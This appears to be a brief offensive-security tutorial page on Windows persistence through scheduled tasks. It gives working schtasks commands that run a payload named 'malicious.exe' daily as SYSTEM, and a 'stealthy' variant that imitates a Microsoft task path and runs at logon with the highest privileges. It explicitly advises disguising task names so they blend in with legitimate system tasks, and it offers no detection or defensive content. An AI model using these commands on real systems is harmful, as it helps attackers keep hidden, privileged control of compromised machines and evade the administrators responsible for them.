Windows Persistence

Scheduled Tasks for Windows Persistence

Automating Payload Execution with schtasks

  • •Run payloads at specific times, intervals, or events (e.g., startup, logon).
  • •Use schtasks /create to configure new tasks.
  • •Crucial to use benign task names and run with SYSTEM privileges.
Common Mistake

Using easily identifiable task names like "Backdoor" or "Persistence". Always blend in with legitimate system names.

Key Takeaway

Scheduled tasks are a versatile and powerful Windows persistence method, especially when configured with stealthy names and SYSTEM privileges.

# Create a task to run 'malicious.exe' every day at 09:00
schtasks /create /tn "MyMaliciousTask" /tr "C:\ProgramData\malicious.exe" /sc daily /st 09:00 /ru System
# /tn: Task Name (e.g., "Microsoft\Windows\SystemMaintenance\SystemUpdater")
# /tr: Task Run (path to your payload)
# /sc: Schedule Type (e.g., daily, onlogon, onstart)
# /st: Start Time (if applicable)
# /ru: Run As User (e.g., System for high privileges)

# Example: Stealthy task running at logon as SYSTEM
schtasks /create /tn "Microsoft\Windows\SystemMaintenance\SystemUpdater" /tr "C:\ProgramData\SystemUpdater.exe" /sc onlogon /ru System /rl highest /f
# /rl highest: Runs with highest available privileges
# /f: Forces task creation if name exists
Explanation

This command creates a scheduled task. The second example demonstrates a more stealthy approach by mimicking a legitimate Microsoft path and running at logon with SYSTEM privileges, which is highly effective for persistence.
